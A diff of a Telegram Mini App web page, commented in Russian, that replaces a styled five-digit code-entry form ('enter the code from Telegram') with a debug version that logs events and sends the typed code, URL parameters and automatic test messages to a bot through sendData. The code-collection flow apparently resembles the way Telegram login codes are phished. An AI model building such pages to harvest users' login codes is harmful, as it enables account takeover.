@@ -8,71 +8,46 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2a 100%);
-            min-height: 100vh;
-            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0a0a;
+            color: white;
             padding: 20px;
         }
-        .container { max-width: 400px; margin: 0 auto; padding-top: 40px; }
-        .header { text-align: center; margin-bottom: 40px; }
-        .logo { font-size: 48px; margin-bottom: 20px; text-shadow: 0 0 20px #9d00ff; }
-        .title { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
-        .subtitle { font-size: 15px; color: #b8b8b8; margin-bottom: 30px; }
-        .code-container {
-            display: flex; justify-content: center; gap: 12px;
-            margin: 40px 0; padding: 0 20px;
-        }
-        .code-input {
-            width: 56px; height: 68px;
-            border: 2px solid rgba(157, 0, 255, 0.3);
-            border-radius: 16px;
-            background: rgba(30, 30, 40, 0.8);
-            color: #fff;
-            font-size: 32px; font-weight: 700;
-            text-align: center; outline: none;
-            transition: all 0.3s ease;
-        }
-        .code-input:focus {
-            border-color: #9d00ff;
-            box-shadow: 0 0 0 2px rgba(157, 0, 255, 0.3);
+        .container { max-width: 400px; margin: 0 auto; }
+        .input { 
+            width: 100%; padding: 15px; margin: 10px 0;
+            background: #222; border: 2px solid #9d00ff;
+            border-radius: 10px; color: white; font-size: 18px;
         }
         .button {
-            width: 100%; height: 56px;
-            background: linear-gradient(135deg, #9d00ff 0%, #6a00cc 100%);
-            border: none; border-radius: 16px;
-            color: white; font-size: 17px; font-weight: 600;
-            cursor: pointer; transition: all 0.3s ease;
-            margin-bottom: 20px;
+            width: 100%; padding: 15px; margin: 10px 0;
+            background: linear-gradient(135deg, #9d00ff, #6a00cc);
+            border: none; border-radius: 10px; color: white;
+            font-size: 18px; font-weight: bold; cursor: pointer;
         }
-        .button:disabled {
-            background: #5a5a5a;
-            cursor: not-allowed;
+        .log { 
+            background: #222; padding: 10px; margin-top: 20px;
+            border-radius: 5px; font-family: monospace; font-size: 12px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <div class="logo">🔐</div>
-            <h1 class="title">Подтверждение кода</h1>
-            <p class="subtitle">Введите 5-значный код из Telegram</p>
-        </div>
+        <h2>Тест отправки данных в бота</h2>
         
-        <div class="code-container">
-            <input type="text" class="code-input" maxlength="1" data-index="0">
-            <input type="text" class="code-input" maxlength="1" data-index="1">
-            <input type="text" class="code-input" maxlength="1" data-index="2">
-            <input type="text" class="code-input" maxlength="1" data-index="3">
-            <input type="text" class="code-input" maxlength="1" data-index="4">
-        </div>
+        <input type="text" id="codeInput" class="input" 
+               placeholder="Введите 5-значный код" maxlength="5">
         
-        <button class="button" id="verifyButton" disabled>
-            Подтвердить код
+        <button class="button" onclick="sendTestData()">
+            📨 Отправить данные в бота
         </button>
         
-        <div style="text-align: center; color: #888; font-size: 13px;">
-            Данные отправятся в Telegram бота
+        <button class="button" onclick="sendRealData()">
+            🔐 Отправить реальные данные
+        </button>
+        
+        <div class="log" id="log">
+            Журнал событий:
         </div>
     </div>
 
@@ -80,94 +55,101 @@
         // Инициализация Telegram WebApp
         let tg = window.Telegram.WebApp;
         
-        // Расширяем на весь экран и включаем кнопку назад
+        // Отображаем в логах
+        function log(message) {
+            console.log(message);
+            document.getElementById('log').innerHTML += 
+                '<br>' + new Date().toLocaleTimeString() + ': ' + message;
+        }
+        
+        // Расширяем на весь экран
         tg.expand();
-        tg.BackButton.show();
-        tg.BackButton.onClick(() => {
-            tg.close();
-        });
+        log('Mini App загружен');
+        log('User ID: ' + (tg.initDataUnsafe?.user?.id || 'неизвестно'));
         
-        // Элементы DOM
-        const codeInputs = document.querySelectorAll('.code-input');
-        const verifyButton = document.getElementById('verifyButton');
-        let currentCode = '';
-        
-        // Настройка ввода кода
-        codeInputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                const value = e.target.value.replace(/\D/g, '');
-                e.target.value = value;
-                
-                if (value && index < 4) {
-                    codeInputs[index + 1].focus();
-                }
-                
-                updateCode();
-                updateButtonState();
-            });
+        // Функция отправки тестовых данных
+        function sendTestData() {
+            log('Пытаюсь отправить тестовые данные...');
             
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !e.target.value && index > 0) {
-                    codeInputs[index - 1].focus();
-                    codeInputs[index - 1].value = '';
-                    updateCode();
-                    updateButtonState();
-                }
+            // Способ 1: sendData
+            try {
+                tg.sendData(JSON.stringify({
+                    action: 'test',
+                    code: '12345',
+                    timestamp: Date.now(),
+                    message: 'Тест из Mini App'
+                }));
+                log('✅ sendData вызван успешно');
+            } catch (error) {
+                log('❌ Ошибка sendData: ' + error.message);
+            }
+            
+            // Способ 2: Через showAlert для проверки
+            tg.showPopup({
+                title: 'Данные отправлены',
+                message: 'Проверьте бота',
+                buttons: [{type: 'ok'}]
             });
-        });
-        
-        // Автофокус на первое поле
-        setTimeout(() => codeInputs[0].focus(), 300);
-        
-        // Обновление текущего кода
-        function updateCode() {
-            currentCode = Array.from(codeInputs)
-                .map(input => input.value)
-                .join('');
-            console.log('Текущий код:', currentCode);
         }
         
-        // Обновление состояния кнопки
-        function updateButtonState() {
-            verifyButton.disabled = currentCode.length !== 5;
-        }
-        
-        // Обработка нажатия кнопки
-        verifyButton.addEventListener('click', () => {
-            if (currentCode.length !== 5) return;
+        // Функция отправки реальных данных
+        function sendRealData() {
+            const code = document.getElementById('codeInput').value;
             
-            console.log('Отправка кода в бота:', currentCode);
+            if (!code) {
+                tg.showPopup({
+                    title: 'Ошибка',
+                    message: 'Введите код',
+                    buttons: [{type: 'ok'}]
+                });
+                return;
+            }
             
-            // КРИТИЧЕСКИ ВАЖНО: отправка данных в бота
-            // Используем tg.sendData() для отправки данных
+            log('Отправка кода: ' + code);
+            
+            // Получаем параметры из URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get('user_id');
+            const expectedCode = urlParams.get('code');
+            
+            // Отправляем данные
             tg.sendData(JSON.stringify({
-                code: currentCode,
-                user_id: tg.initDataUnsafe?.user?.id || 'unknown',
+                action: 'verify_code',
+                code: code,
+                user_id: userId,
+                expected_code: expectedCode,
                 timestamp: Date.now(),
-                platform: 'mini_app'
+                source: 'mini_app'
             }));
+            
+            log('✅ Код отправлен в бота');
             
             // Показываем уведомление
             tg.showPopup({
-                title: '✅ Код отправлен',
-                message: 'Данные отправлены в бота. Закройте приложение.',
-                buttons: [{ type: 'ok' }]
+                title: 'Успешно!',
+                message: 'Код отправлен на проверку',
+                buttons: [{type: 'ok'}]
             });
             
-            // Деактивируем кнопку
-            verifyButton.disabled = true;
-            verifyButton.textContent = 'Отправлено ✓';
-            
-            // Закрываем приложение через 2 секунды
+            // Закрываем через 2 секунды
             setTimeout(() => {
                 tg.close();
             }, 2000);
-        });
+        }
         
-        // Логирование для отладки
-        console.log('Mini App инициализирован');
-        console.log('User data:', tg.initDataUnsafe?.user);
-        console.log('Init data:', tg.initData);
+        // Автоматическая отправка при загрузке (для теста)
+        setTimeout(() => {
+            log('Автоотправка тестовых данных через 3 секунды...');
+            
+            setTimeout(() => {
+                tg.sendData(JSON.stringify({
+                    action: 'auto_test',
+                    message: 'Автоматическая отправка',
+                    time: Date.now()
+                }));
+                log('✅ Автоотправка выполнена');
+            }, 3000);
+        }, 1000);
         
     </script>
 </body>
